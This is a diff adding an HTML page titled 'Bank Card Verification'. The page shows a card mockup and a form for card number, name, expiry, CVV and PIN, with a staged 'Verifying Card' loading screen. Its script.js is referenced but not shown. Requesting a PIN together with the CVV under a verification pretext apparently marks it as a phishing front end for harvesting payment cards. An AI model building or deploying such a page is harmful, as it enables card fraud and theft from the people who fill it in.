@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Card</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="bg-zinc-950 text-white min-h-screen py-12 px-4">
+    <div class="max-w-md mx-auto">
+        <h1 class="text-3xl font-semibold text-center mb-8">Bank Card Verification</h1>
+        
+        <!-- Card -->
+        <div class="card-container mx-auto mb-10" id="cardContainer">
+            <div class="credit-card" id="creditCard">
+                <!-- Front Side -->
+                <div class="card-face card-front">
+                    <div class="flex justify-between items-start">
+                        <div class="chip">
+                            <span class="emv">EMV</span>
+                        </div>
+                        <div id="cardLogo" class="card-logo"></div>
+                    </div>
+                    
+                    <div class="card-number" id="cardNumberDisplay">0000 0000 0000 0000</div>
+                    
+                    <div class="card-info">
+                        <div class="card-holder">
+                            <div class="label">CARDHOLDER</div>
+                            <div class="card-name" id="cardNameDisplay">PETER URBAN</div>
+                        </div>
+                        <div class="card-expiry-box">
+                            <div class="label">VALID THRU</div>
+                            <div class="card-expiry" id="cardExpiryDisplay">12/28</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Back Side -->
+                <div class="card-face card-back">
+                    <div class="magnetic-strip"></div>
+                    <div class="cvv-container">
+                        <div class="cvv-label">CVV</div>
+                        <div class="cvv-box" id="cvvDisplay">000</div>
+                    </div>
+                    <div class="card-signature">AUTHORIZED SIGNATURE</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Form -->
+        <div class="form-container" id="formContainer">
+            <div class="space-y-6">
+                <div>
+                    <label class="form-label">Card Number</label>
+                    <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" class="input-field">
+                </div>
+                <div>
+                    <label class="form-label">Cardholder Name</label>
+                    <input type="text" id="cardName" placeholder="PETER URBAN" class="input-field">
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="form-label">Expiry Date</label>
+                        <input type="text" id="cardExpiry" maxlength="5" placeholder="MM/YY" class="input-field">
+                    </div>
+                    <div>
+                        <label class="form-label">CVV</label>
+                        <input type="text" id="cardCVV" maxlength="4" placeholder="123" class="input-field">
+                    </div>
+                </div>
+                <div>
+                    <label class="form-label">PIN Code</label>
+                    <input type="text" id="cardPIN" maxlength="4" placeholder="1234" class="input-field">
+                </div>
+            </div>
+        </div>
+    </div>
+
+   
+  
+  <!-- Verification Button -->
+        <button id="verifyBtn" 
+                class="w-full bg-blue-600 hover:bg-blue-700 transition-colors py-4 rounded-2xl text-lg font-semibold mt-6">
+            Verification
+        </button>
+    </div>
+
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="hidden fixed inset-0 bg-zinc-950/95 backdrop-blur-sm flex items-center justify-center z-50">
+    <div class="text-center">
+        <div class="loader mx-auto"></div>
+
+        <h2 class="text-2xl font-semibold text-blue-400 mt-8">
+            Verifying Card
+        </h2>
+
+        <p class="text-zinc-400 mt-3">
+            Please wait while we verify your information...
+        </p>
+    </div>
+</div>
+  <script src="script.js"></script>
+</body>
+</html>
+ 
